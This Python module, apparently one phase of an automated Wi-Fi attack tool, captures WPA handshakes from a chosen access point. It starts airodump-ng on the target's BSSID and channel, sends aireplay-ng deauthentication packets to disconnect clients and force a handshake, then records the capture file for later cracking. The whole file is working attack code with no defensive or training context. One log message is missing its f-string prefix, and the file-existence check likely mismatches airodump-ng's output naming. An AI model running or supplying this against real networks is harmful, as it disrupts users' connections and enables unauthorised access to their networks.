import subprocess
import os
import time
from core.logger import logger

def capture_handshake(context):
    """Phase 3: Handshake capture (interactive + automated, robust)."""
    logger.info("[Phase 3] Capturing WPA handshake...")

    target = context.get("target")
    iface = context.get("interface")
    capture_time = context.get("capture_time", 30)
    deauth_count = context.get("deauth_count", 5)
    auto_mode = context.get("auto_select", False)

    if not target or not iface:
        logger.error("Target or interface missing.")
        return False

    output_file = f"handshake_{target['essid']}.cap"

    try:
        logger.info(f"Starting airodump-ng on {iface} to capture handshake for {target['essid']} ({target['bssid']})...")
        dump_proc = subprocess.Popen([
            "airodump-ng",
            "--bssid", target["bssid"],
            "--channel", str(target["channel"]),
            "--write", output_file[:-4],
            iface
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        logger.info(f"Sending {deauth_count} deauth packets to {target['bssid']} to force handshake...")
        subprocess.run([
            "aireplay-ng", "--deauth", str(deauth_count), "-a", target["bssid"], iface
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        if auto_mode:
            logger.info(f"[Auto Mode] Waiting for handshake capture ({capture_time}s)...")
            time.sleep(capture_time)
        else:
            logger.info(f"Waiting for handshake capture ({capture_time}s)... Press Ctrl+C to stop early.")
            try:
                time.sleep(capture_time)
            except KeyboardInterrupt:
                logger.info("Capture interrupted by user.")

        dump_proc.terminate()
        dump_proc.wait(timeout=5)

        cap_file = output_file
        if os.path.exists(cap_file):
            logger.info("[✓] Handshake captured: {cap_file}")
            context["handshake_file"] = cap_file
            return True
        else:
            logger.error("Handshake capture failed. No .cap file found.")
            return False

    except Exception as e:
        logger.error(f"Error during handshake capture: {e}")
        try:
            dump_proc.terminate()
            dump_proc.wait(timeout=5)
        except Exception:
            pass
        return False
